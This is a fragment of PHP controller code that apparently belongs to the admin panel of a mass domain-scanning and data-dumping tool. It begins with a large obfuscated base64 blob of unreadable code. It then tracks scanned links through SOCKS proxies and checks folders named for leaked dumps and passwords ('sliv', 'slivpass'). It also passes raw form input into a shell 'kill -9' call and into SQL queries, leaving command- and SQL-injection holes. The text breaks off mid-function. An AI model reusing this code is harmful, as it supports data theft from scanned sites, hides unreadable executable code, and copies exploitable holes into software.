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')));
        
        
        
        
        
		
		if(trim(file_get_contents('proxy_good.txt')) == 'bad' and $this->proxy_enable==true) 
		{ 
			echo "SOCKS BAD!<br>";
		}
		
		//$this->d(count(file('proxy.txt')),'socks');
		if(count(file('proxy.txt')) == 0 and $this->proxy_enable==true) { 
			echo "SOCKS VKLUCHENY NO proxy.txt PUSTOY<br>";
			exit;
		}
		
		
		
		$file = $this->Post->query("SELECT * FROM `domens` WHERE `domen_check`=0 AND `bad` !=1 limit 200");
		//RED CHECK na www https
		$domens01 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `domen_check`=1");
		$this->set('domen01',$domens01[0][0]['count(*)']);
		
		$domens02 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `domen_check`=0 AND `bad` !=1");
		$this->set('domen02',$domens02[0][0]['count(*)']);
		
		
		
		
		$domens111 = $this->Post->query("SELECT count(*) FROM `domens`");
		$this->set('domen1',$domens111[0][0]['count(*)']);
		
		$domens112 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `status` =0 AND `bad` !=1");
		$this->set('domen2',$domens112[0][0]['count(*)']);
		
		$domens113 = $this->Post->query("SELECT count(*) FROM `domens` WHERE `status` !=0");
		$this->set('domen3',$domens113[0][0]['count(*)']);
		
		$domens114 = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `status` =2  AND `prohod` <5 AND `header`='get' ");
		$this->set('domen4',$domens114[0][0]['count(*)']);
		
		$domens115 = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `status` =2  AND `prohod` =5 AND `header`='get' ");
		$this->set('domen5',$domens115[0][0]['count(*)']);
		
		
		
		$domens116 = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `status` =2  AND `prohod` <5 AND `header`='post' ");
		$this->set('domen6',$domens116[0][0]['count(*)']);
		
		$domens117 = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE (`status` =2  AND `prohod` =5 AND `header`='post') or (`status` =3 AND `header`='post') ");
		$this->set('domen7',$domens117[0][0]['count(*)']);
		
		
		////
		
		$post_all_links = $this->Post->query("SELECT count(*) FROM `posts_all` ");
        
        if(!isset($post_all_links[0][0]['count(*)']))
        {$post_all_links[0][0]['count(*)']=0;}
		$this->set('post_all_links',$post_all_links[0][0]['count(*)']);
		
		
		$post_all_links_txt = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `from`='txt'  ");
		$this->set('post_all_links_txt',$post_all_links_txt[0][0]['count(*)']);
		
		
		$post_all_links_crowler = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `from`='crowler'  ");
		$this->set('post_all_links_crowler',$post_all_links_crowler[0][0]['count(*)']);
		
		$post_all_links_shlak = $this->Post->query("SELECT count(*) FROM `posts_all` WHERE `status`=1  ");
		$this->set('post_all_links_shlak',$post_all_links_shlak[0][0]['count(*)']);
		
		
		//$this->d($domens111,'$domens111');
		
		//
		// Условия работы системы
		//
		
		
		
		
		
		
		
		
		$host = '92.63.105.55'; //sexx
		if ($host != $_SERVER['HTTP_HOST'] && 'www.'.$host != $_SERVER['HTTP_HOST']){die();}
		

		
        
        
       
        
		
		
		// Информация о наличии прав на запис в папку /sliv
		$this->set('exist_sliv', (is_dir("sliv/") && substr(sprintf('%o', fileperms("sliv/")), -4) == '0777')? 1 : 0);
		
		// Информация о наличии прав на запис в папку /slivpass
		$this->set('exist_slivpass', (is_dir("slivpass/") && substr(sprintf('%o', fileperms("slivpass/")), -4) == '0777')? 1 : 0);
		
        if(isset($this->params['form']['deletepid'])){
        
            if($this->params['form']['deletepid'])
            {
                $squle_id = $this->params['form']['squle_id'];
                $pid  = $this->params['form']['pid'];
                
                $this->logs("kill -9 ".$pid,__FUNCTION__);
                //exit;
                $this->Filed->query("DELETE FROM `starts` WHERE `pid` = $pid");
                
                
                
                if($pid == 0){
                    echo 'PID!!! = '.$pid;
                    
                }else{
                    
                    exec("kill -9 ".$pid);
                }
                
                //die();
                
            }
        }
		
		
         if(isset($this->params['form']['update'])){
        
            if($this->params['form']['update'])
            {
                $id = $this->params['form']['id'];
                $status  = $this->params['form']['status'];
                
                
                $this->d($id);
                $this->d($status);
                
                $this->Post->query("UPDATE  `fileds` SET  `get` = '{$status}' WHERE  `id` =".$id."");
                
                
                
                
                //die();
                
            }
        }
        
        if(isset($this->params['form']['update3'])){
		
